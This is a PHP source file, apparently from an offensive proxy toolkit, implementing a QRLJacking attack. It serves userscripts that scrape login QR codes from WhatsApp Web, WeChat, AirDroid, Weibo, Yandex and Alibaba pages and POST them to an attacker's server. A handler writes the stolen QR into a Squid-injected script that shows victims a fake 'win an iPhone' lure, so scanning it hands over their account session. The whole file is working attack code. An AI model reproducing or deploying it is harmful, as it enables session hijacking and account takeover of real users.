<?php
$domain = 'http://127.0.0.1';
const PASARELA = '/etc/squid/pasarela.js';

function inject_qr($src){
$pasarela = <<<MARKER
//IGNORE
if(!document.getElementById('#qrl')){
  var link = document.createElement('link');
  link.id = 'qrl';
  link.rel = 'stylesheet';
  link.type = 'text/css';
  link.href = '/proxyboard/css/qr.css';
  document.head.appendChild(link);
}
function lightbox_open(){
  window.scrollTo(0,0);
  document.getElementById('light').style.display='block';
  document.getElementById('fade').style.display='block';
}
function lightbox_close(){
  document.getElementById('light').style.display='none';
  document.getElementById('fade').style.display='none';
}
document.body.insertAdjacentHTML('beforeend', '<div id="light"><strong>SCAN & GET A CHANCE TO WIN AN iPhone</strong><br/> \
  <img src="data:image/png;base64,$src" /></div><div id="fade" onclick="lightbox_close();"></div>');
MARKER;
return $pasarela;
}

function update_pasarela($content, $mode){
    $fp = fopen(PASARELA, $mode);
    fwrite($fp, $content);
    fclose($fp);
}
?>

<?php
  if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['c'])){
    $src = $_POST['c'];
    if(file_exists(PASARELA)){
        $qr = trim(file_get_contents(PASARELA));
        $pattern = '/src=\"data:image\/png;base64,(.+?)\"/';
        preg_match($pattern, $qr, $matches);
        if(!empty($matches)){
          $qr = preg_replace("/$matches[1]/", $src, $qr);
        }
        else{
          $qr = inject_qr($src);
        }
        update_pasarela($qr, 'a');
    }
    exit;
  }
  else if(!isset($_GET['f'])){
    header('Location: index.php', true, 301);
    exit;
  }
  else{
    header('Content-Type: application/javascript');
  }
?>

<?php
$WhatsApp = <<<MARKER
    if (loc.indexOf('web.whatsapp.com') >= 0)
    {
      if (document.getElementsByClassName('qr-button')[0] !== undefined)
      {
        document.getElementsByClassName('qr-button')[0].click();
      }
      if (document.getElementsByClassName('icon icon-chat')[0] == null)
      {
        var xhttp = new XMLHttpRequest();
        var params = "c=" + document.getElementsByTagName('img')[0].src;
        xhttp.open('POST', '$domain/QRLJacking.php', true);
        xhttp.send(params);
      }
    }
MARKER;

$WeChat = <<<MARKER
    if (loc.indexOf('.wechat.com') >= 0)
    {
      if (document.getElementsByClassName('qrcode') [0] !== null)
      {
        var xhttp = new XMLHttpRequest();
        var params = "c=" + encodeURIComponent(document.getElementsByClassName('img') [0].src);
        xhttp.open('POST', '$domain/QRLJacking.php' , true);
        xhttp.send(params);
      }
    }
MARKER;

$AirDroid = <<<MARKER
    if (loc.indexOf('web.airdroid.com') >= 0)
    {
      
      if (document.getElementsByClassName('widget-login-qr-imgWrapper widget-login-qr-loading') [0] !== null)
      {
        var xhttp = new XMLHttpRequest();
        var params = "c=" + encodeURIComponent(document.getElementsByTagName('img') [14].src);
        xhttp.open('POST', '$domain/QRLJacking.php' , true);
        xhttp.send(params);
      }
    }
MARKER;

$Weibo = <<<MARKER
    if (loc.indexOf('weibo.com') >= 0)
    {
      if ( document.getElementsByTagName('img')[1].src !== null)
      {
        var xhttp = new XMLHttpRequest();
        var params = "c=" + encodeURIComponent(document.getElementsByTagName('img')[1].src);
        xhttp.open('POST', '$domain/QRLJacking.php', true);
        xhttp.send(params);
      }
    }
MARKER;

$Yandex = <<<MARKER
    if (loc.indexOf('passport.yandex.com') >= 0)
    {
      
      if (document.getElementsByClassName('qr-code__i')[0].style.getPropertyValue("background-image") !== null)
      {
        var a=document.getElementsByClassName('qr-code__i')[0].style.getPropertyValue("background-image");
        var res = a.replace("url(\"/auth", "https://passport.yandex.com/auth"); 
        var res2 = res.replace("\"), none","");

        var xhttp = new XMLHttpRequest();
        var params = "c=" + encodeURIComponent(res2);
        xhttp.open('POST', '$domain/QRLJacking.php', true);
        xhttp.send(params);
      }
    }
MARKER;

$Alibaba = <<<MARKER
    if (loc.indexOf('passport.alibaba.com') >= 0)
    {
      if (document.getElementsByClassName('fm-button refresh J_QRCodeRefresh')[0] !== undefined)
      {
        document.getElementsByClassName('fm-button refresh J_QRCodeRefresh')[0].click();
      }
      if (document.getElementsByTagName('img')[0].src !== null)
      {
        var xhttp = new XMLHttpRequest();
        var params = "c=" + document.getElementsByTagName('img')[0].src;
        xhttp.open('POST', '$domain/QRLJacking.php', true);
        xhttp.send(params);
      }
    }
MARKER;
?>

// ==UserScript==
// @name QRJacking Module
// @namespace BADPROXY
// ==/UserScript==

<?php
  print "/***** REPLACE $domain *****/\n";
?>

var myTimer;
myTimer = window.setInterval(loopForQR, 5000);
function loopForQR() {
  if (document.readyState == 'complete') {
    loc = window.location.href;
    <?php
      switch($_GET['f']){
      case 'WhatsApp':
        print $WhatsApp;
        break;
      case 'WeChat':
        print $WeChat;
        break;
      case 'AirDroid':
        print $AirDroid;
        break;
      case 'Weibo':
        print $Weibo;
        break;
      case 'Yandex Mail':
        print $Yandex;
        break;
      case 'Alibaba':
        print $Alibaba;
        break;
      }
    ?>
  }
}
